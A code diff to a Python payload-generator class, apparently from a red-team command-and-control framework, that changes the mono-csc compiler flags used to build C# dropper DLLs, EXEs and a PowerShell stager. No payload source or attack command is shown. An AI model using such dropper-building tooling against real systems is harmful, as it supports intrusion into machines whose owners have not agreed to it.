@@ -217,8 +217,8 @@ class Payloads(object):
             compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:library -out:%s%sdropper_cs.dll %s%sdropper.cs " % (self.BaseDirectory, name, self.BaseDirectory, name)
             compileexe = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:exe -out:%s%sdropper_cs.exe %s%sdropper.cs " % (self.BaseDirectory, name, self.BaseDirectory, name)
         else:
-            compile = "mono-csc %s%sdropper.cs -out:%s%sdropper_cs.dll -target:library -warn:2" % (self.BaseDirectory, name, self.BaseDirectory, name)
-            compileexe = "mono-csc %s%sdropper.cs -out:%s%sdropper_cs.exe -target:exe -warn:2" % (self.BaseDirectory, name, self.BaseDirectory, name)
+            compile = "mono-csc %s%sdropper.cs -out:%s%sdropper_cs.dll -target:library -sdk:4 -warn:1" % (self.BaseDirectory, name, self.BaseDirectory, name)
+            compileexe = "mono-csc %s%sdropper.cs -out:%s%sdropper_cs.exe -target:exe -sdk:4 -warn:1" % (self.BaseDirectory, name, self.BaseDirectory, name)
         subprocess.check_output(compile, shell=True)
         self.QuickstartLog("C# Dropper DLL written to: %s%sdropper_cs.dll" % (self.BaseDirectory, name))
         subprocess.check_output(compileexe, shell=True)
@@ -415,8 +415,8 @@ ao.run('%s', 0);window.close();
             compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:library -out:%s%sdropper_cs_ps.dll %s%sSharp_Posh_Stager.cs -reference:System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name)
             compileexe = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:exe -out:%s%sdropper_cs_ps.exe %s%sSharp_Posh_Stager.cs -reference:System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name)
         else:
-            compile = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v2.exe -target:exe -sdk:2 -warn:2 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory)
-            compileexe = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v4.exe -target:exe -sdk:4 -warn:2 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory)
+            compile = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v2.exe -target:exe -sdk:2 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory)
+            compileexe = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v4.exe -target:exe -sdk:4 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory)
         subprocess.check_output(compile, shell=True)
         self.QuickstartLog("C# Powershell v2 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))
         subprocess.check_output(compileexe, shell=True)
